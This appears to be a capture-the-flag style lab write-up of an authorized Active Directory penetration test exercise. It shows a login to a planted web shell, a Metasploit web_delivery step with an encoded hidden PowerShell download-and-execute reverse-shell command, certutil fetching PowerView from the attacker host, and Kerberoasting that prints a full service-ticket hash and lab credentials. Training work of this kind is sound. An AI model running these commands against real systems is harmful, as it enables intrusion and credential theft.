The complete course is [[Index |here]]
# Background
A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: ***admin:My_W3bsH3ll_P@ssw0rd!*** in place for us to start from in the /uploads directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

# Question 1: Submit the contents of the flag.txt file on the administrator Desktop of the web server

## Nmap Scan
```
┌──(root㉿kali)-[/home/z3tssu/Downloads]
└─# nmap -p80,445,135,139 -v -Pn 10.129.202.242
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-14 21:19 +04
Initiating Parallel DNS resolution of 1 host. at 21:19
Completed Parallel DNS resolution of 1 host. at 21:19, 0.00s elapsed
Initiating SYN Stealth Scan at 21:19
Scanning 10.129.202.242 [4 ports]
Discovered open port 135/tcp on 10.129.202.242
Discovered open port 80/tcp on 10.129.202.242
Discovered open port 139/tcp on 10.129.202.242
Discovered open port 445/tcp on 10.129.202.242
Completed SYN Stealth Scan at 21:19, 0.28s elapsed (4 total ports)
Nmap scan report for 10.129.202.242
Host is up (0.25s latency).

PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

```

## Navigating the Webserver /uploads
The instructions basically gives us a credential and a URL path to go to
http://10.129.202.242/uploads/

```
admin:My_W3bsH3ll_P@ssw0rd!
```

this seems like a directory of some sort, lets enumerate further
1. Only the antak.aspx works

![[Pasted image 20251014213138.png]]

Once we browse to the antak.aspx, we are greeted with a login page

![[Pasted image 20251014213148.png]]

lets try and use the credentials here **admin:My_W3bsH3ll_P@ssw0rd!**
![[Pasted image 20251014213315.png]]

We have access using the given credentials

## Reading the Flag.txt contents
```
cat c:\users\administrator\desktop\flag.txt
```

![[Pasted image 20251014213814.png]]

# Question 2: Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer

We will have to elevate our privileges and get a proper shell on the target, lets do so using Meterpreter 

We will use the ***web_delivery*** exploit
## Use Metasploit to elevate the shell
```bash
msfconsole -q 
search web_delivery
use exploit/multi/script/web_delivery 
```
### Set the options
```
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST PWNIP
set SRVHOST PWNIP
set TARGET 2 
exploit
```
### Copy the payload to the target webserver's shell
```
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABlADEAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAZQAxAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAZQAxAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAxADcAOgA4ADAAOAAwAC8AWAB1AGEARQBmAHAAQwBDAGIAcAAzAHgAUQA1AC8AMwBoADAATQBqADUAeABuAEcAUABuAEYAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEAMQA3ADoAOAAwADgAMAAvAFgAdQBhAEUAZgBwAEMAQwBiAHAAMwB4AFEANQAnACkAKQA7AA==

```
### Shell Obtained in Meterpreter
![[Pasted image 20251015192935.png]]
### Migrating the Process
We have to migrate to the process that we just created as some commands required higher privileges
use the command ***ps*** to list the processes
![[Pasted image 20251015193203.png]]

Then we need to migrate to the process with the name of ***winlogon.exe***
```
migrate process_ID
```
![[Pasted image 20251015193309.png]]

## Use PowerView to perform Kerberoasting
### Download PowerView on the attacker machine
I already have it on my machine, but it can be downloaded using the following
```
wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```
### Host PowerView using a Python Server (attacker Machine)
```
python -m http.server 9090 
```
### Download the PowerView file on the target machine
```
# In Meterpreter

shell

# Then

certutil.exe -f -urlcache -split http://10.10.14.117:9090/PowerView.ps1 PowerView.ps1
```
![[Pasted image 20251015194110.png]]
### Run PowerView 
1. Switch back to the powershell shell
```
powershell
```
2. run powerview
```bash
Import-Module .\PowerView.ps1 

Get-DomainUser * -SPN | select samaccountname
```
![[Pasted image 20251015194252.png]]
### Targeting a specific user to Kerberoast
```
Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
```
![[Pasted image 20251015194551.png]]
### Copying the Kerberoast hash and format it
```
echo " 
Hash                 : $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$4D1A52F5978249
                       C1ECC26C68767370AD$9F88C0B391355FAAEAC8EDFF932FFEA424031D47935ACEDEA3AAD86195BEF3C84D9A01A434DF7
                       02B67500A0A43432B8C1DEACA5E24A5F457691997D2794158EE5764833573F4E3C2A27BEF961E6092E0190F0481DCF8C
                       68AA4A4ACC9F0B447654FB4C2966B6FE4F68D730942ECCE50D23C591B85A2108990E1631C7813D27C53D7F280A47A9F7
                       2717BE81FFA12B994529629C42565F9F95C62EC579123EF44B9170BB89F6BC386F1169C2DA6E1CDF9D719CE01718CFEC
                       BB3784027EEBBA7FDE6915C6837BF229C90D7514A9B2D1FC7AAE9D0F4C9653E72B667FAB99958185C8EE2FCAC17EA859
                       17D53A484F10E6F60ABAD7D56A8DD1A3EC65B13A593DC7C8D356949BB26EFF4B7AC912768A9C35DAB4A1AD2F6DAE4CA9
                       AB2AAEE93BD1953E3D9050973D4AB393C5B0B76AE68AE1E61590C1CF0F2F872B99A4E1E3CD5CE8DD08A135521BC1AD01
                       F9F7F722CAE6C192D3D3659F1B2FE218E72FA73D2CE53ED18B8632AF9EBB5DEB8491A0DEAC03DC5036BBC2B44E24F22F
                       A7ADC1B49F4B55F87689FC93B14BFE5474D048F58EFDE7929DA10DEAB82CFDA4264F92E9D7273C4453045879FAB52B22
                       472327F569E17030479FCC15690BF7BC69053A45A1FD1E375E047F3F7B1F48614435178468BAF6577978ED2026E91FC3
                       482FD8490947FB6B6E4219582A351C67EC255B9FDF760A4DAFB21CAED89D0421B79845BFD451057763ADF82BADA17B17
                       22ACD4AAE5A44513B3DEB052B84CEA58DAF0BF87BB7A0AD7063997A8697F980506D2A07BBFBF59E48F6446E81B87A42B
                       E16D83776D8EC9C9F97F59076BB30ED9B7ED379B7E82F4D80E998D8F8EC5864049D12875FC01BCA4C59FF1C16A7DDE81
                       3785978E22AC3721896F49F298FB7F3DBA6C8FD258E6D12CDB41FA61C48405242447AC7F7DA7452124B03843567AE00A
                       B2BE463E0E0965E36E68286BBCA13400799A9EF32675C96603ED6E4733C83F98BAFC26FC24505B09851770BD8E849CA3
                       8CB41B1AEF5B01859B986C4C7ED7FEC45A63EDD8E5844B426197536CF05C81F59501368713172E9D9DC7C84C24E193D9
                       0191304521D2B1A1B6A0ACF0E3490C49B8DC51C56F1FC324509CC0179746C0C6E6A5DDB1CD822C6788959B57F4CFFFC3
                       7A30D11C4F3FCFFDFFC42FAE4478DDF72C3C52AEFEF2AF1439B048F1153CD764267D9F3EED17BB236E2AD4FBEC3A741A
                       A19B3FCF0CA1ADF257221A794D2277AC56ECBDD17AE5C9530A9DA8BCC53D9DCA1D57D5EAAE7E7519B8321D85A5E87341
                       33073D7D46C1042E0E954052DC63806F3DC499ADC44533357E7BAB0C1FFF2F8E6F0B4EE24D73720785C16188EE3BEA7D
                       D2635B78CC42773C6FA9F3C802B2E54E5FE74D73E1C80EEFF7BCCA53C7B417CF1B8D75E2D1FB8B9C1D81742009E3E836
                       15099A13656B87A372709CFDE4383E6B653F49E15ED2C6AD6462E6660FE631E077FA32F4DDD3EF8F30DD7DB0EAF06D2A
                       71E87D133B9C8890841427E89433D7CBD855A8272893AF80777E34A8A46CA1E31F1
" | tr -d "[:space:]" > tgs_file
```
